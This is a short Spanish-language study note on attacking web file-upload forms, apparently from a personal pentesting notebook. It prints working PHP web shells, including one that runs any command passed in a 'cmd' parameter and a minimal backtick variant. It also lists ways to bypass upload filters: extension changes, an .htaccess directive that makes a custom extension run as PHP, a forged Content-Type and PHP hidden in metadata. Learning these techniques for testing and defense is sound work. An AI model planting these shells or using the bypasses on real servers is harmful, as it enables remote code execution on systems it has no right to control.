#web 

# Qué son las subidas de archivos

Son formularios que nos permiten subir un archivo a un servidor. Esto, sumado a que tengamos acceso a dichos archivos, puede llegar a permitir una ejecución *remota de comandos* ([[RCE]]). Por ejemplo, imagina ejecutar un archivo como el siguiente:

```php
<?php
	system("whoami");
?>
```
> Así podríamos ejecutar un comando, en este caso *whoami*.

O pudiendo controlar el comando:

```php
<?php
	system($_GET['cmd']);
?>
```
> Así podemos controlar el comando mediante el parámetro *cmd*.

# Medidas de seguridad

## Tipo de archivo

### Extensión

En ocasiones el servidor comprueba el tipo de archivo antes de aceptarlo p.e. *.png*. A veces simplemente se comprueba si la extensión coincide, en tal caso serviría con sólo cambiarla (existen multitud de alternativas para cada una).

#### .htaccess

Mediante un fichero de configuración *.htaccess* podemos definir directivas a nivel de directorio en **Apache**. De forma que si podemos crear un archivo con dicha extensión podemos definir que una extensión se interprete de cierta forma.

```php
AddType application/x-httpd-php .myExt
```

### Content type

A veces el tipo de archivo se comprueba mediante la cabecera *Content-Type*, en ese caso podemos simplemente modificarla.

Otras, se comprueban los [[magic bytes]] de un archivo.

### Metadatos

Con herramientas como [[exiftool]] podemos incluir código PHP  malicioso como un metadato.

## Longitud de archivo

Podríamos utilizar un payload más corto como:

```php
<?=`$_GET[0]`?>
```

## Cambio de nombre

AL subir el archivo, el servidor puede estar renombrando el archivo. Puede ser de distintas formas, como cifrándolo con *md5* o *sha*.